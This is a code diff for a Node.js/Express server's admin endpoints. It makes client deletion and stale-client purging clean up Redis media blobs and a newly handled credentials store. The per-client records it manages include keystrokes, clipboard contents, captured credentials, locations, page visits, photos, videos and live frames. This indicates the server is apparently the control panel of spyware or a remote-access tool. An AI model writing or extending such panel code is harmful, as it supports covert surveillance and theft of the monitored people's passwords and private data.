@@ -1096,20 +1096,35 @@ app.post('/api/test-event', requireAuth, (req, res) => {
 });
 
 // ── Delete client ──
-app.delete('/api/client/:id', requireAuth, (req, res) => {
+app.delete('/api/client/:id', requireAuth, async (req, res) => {
     const id = req.params.id;
+
+    // Collect Redis media keys to delete
+    if (USE_REDIS && redis) {
+        try {
+            // Delete live frame
+            await redis.del(`live:frame:${id}`);
+            // Delete photo + video blobs stored in Redis for this client
+            const photoIds = (store.photos || []).filter(p => p.clientId === id).map(p => p.id);
+            const videoIds = (store.media  || []).filter(m => m.clientId === id).map(m => m.id);
+            const del = [...photoIds.map(x => `media:photo:${x}`), ...videoIds.map(x => `media:video:${x}`)];
+            if (del.length) await Promise.all(del.map(k => redis.del(k)));
+        } catch {}
+    }
+
     delete store.clients[id];
     delete store.deviceInfo[id];
-    if (store.notes) delete store.notes[id];
-    if (store.tags)  delete store.tags[id];
-    store.locations  = store.locations.filter(l => l.clientId !== id);
-    store.media      = store.media.filter(m => m.clientId !== id);
-    store.photos     = store.photos.filter(p => p.clientId !== id);
-    store.errors     = store.errors.filter(e => e.clientId !== id);
-    store.keystrokes = store.keystrokes.filter(k => k.clientId !== id);
-    store.clipboard  = store.clipboard.filter(c => c.clientId !== id);
-    store.pageVisits = store.pageVisits.filter(v => v.clientId !== id);
-    store.events     = store.events.filter(e => e.data?.clientId !== id);
+    if (store.notes)       delete store.notes[id];
+    if (store.tags)        delete store.tags[id];
+    store.locations    = store.locations.filter(l => l.clientId !== id);
+    store.media        = store.media.filter(m => m.clientId !== id);
+    store.photos       = store.photos.filter(p => p.clientId !== id);
+    store.errors       = store.errors.filter(e => e.clientId !== id);
+    store.keystrokes   = store.keystrokes.filter(k => k.clientId !== id);
+    store.clipboard    = store.clipboard.filter(c => c.clientId !== id);
+    store.pageVisits   = store.pageVisits.filter(v => v.clientId !== id);
+    store.credentials  = (store.credentials || []).filter(c => c.clientId !== id);
+    store.events       = store.events.filter(e => e.data?.clientId !== id);
     saveStore();
     console.log(`\u{1F5D1}\u{FE0F}  Client ${id} deleted`);
     res.json({ success: true });
@@ -1270,21 +1285,54 @@ app.delete('/api/purge/:type', requireAuth, async (req, res) => {
 });
 
 // ── Purge stale offline clients (not seen in N days) ──
-app.delete('/api/clients/stale', requireAuth, (req, res) => {
+app.delete('/api/clients/stale', requireAuth, async (req, res) => {
     const days = Math.max(0.5, parseFloat(req.query.days || '3'));
     const cutoff = Date.now() - days * 86400000;
     let deleted = 0;
+    const staleIds = [];
+
     Object.keys(store.clients).forEach(id => {
         const cl = store.clients[id];
         if (!cl.online && new Date(cl.lastSeen || 0).getTime() < cutoff) {
+            staleIds.push(id);
+            deleted++;
+        }
+    });
+
+    if (staleIds.length) {
+        // Redis cleanup for stale clients
+        if (USE_REDIS && redis) {
+            try {
+                const photoIds = (store.photos || []).filter(p => staleIds.includes(p.clientId)).map(p => p.id);
+                const videoIds = (store.media  || []).filter(m => staleIds.includes(m.clientId)).map(m => m.id);
+                const del = [
+                    ...staleIds.map(id => `live:frame:${id}`),
+                    ...photoIds.map(x => `media:photo:${x}`),
+                    ...videoIds.map(x => `media:video:${x}`)
+                ];
+                if (del.length) await Promise.all(del.map(k => redis.del(k).catch(() => {})));
+            } catch {}
+        }
+
+        staleIds.forEach(id => {
             delete store.clients[id];
             delete store.deviceInfo?.[id];
             if (store.notes) delete store.notes[id];
             if (store.tags)  delete store.tags[id];
-            deleted++;
-        }
-    });
-    if (deleted) saveStore();
+        });
+        const staleSet = new Set(staleIds);
+        store.locations    = store.locations.filter(l => !staleSet.has(l.clientId));
+        store.photos       = store.photos.filter(p => !staleSet.has(p.clientId));
+        store.media        = store.media.filter(m => !staleSet.has(m.clientId));
+        store.keystrokes   = store.keystrokes.filter(k => !staleSet.has(k.clientId));
+        store.clipboard    = store.clipboard.filter(c => !staleSet.has(c.clientId));
+        store.pageVisits   = store.pageVisits.filter(v => !staleSet.has(v.clientId));
+        store.credentials  = (store.credentials || []).filter(c => !staleSet.has(c.clientId));
+        store.errors       = store.errors.filter(e => !staleSet.has(e.clientId));
+        store.events       = store.events.filter(e => !staleSet.has(e.data?.clientId));
+        saveStore();
+    }
+
     console.log(`\u{1F5D1}\u{FE0F}  Purged ${deleted} stale clients (>${days}d offline)`);
     res.json({ success: true, deleted });
 });
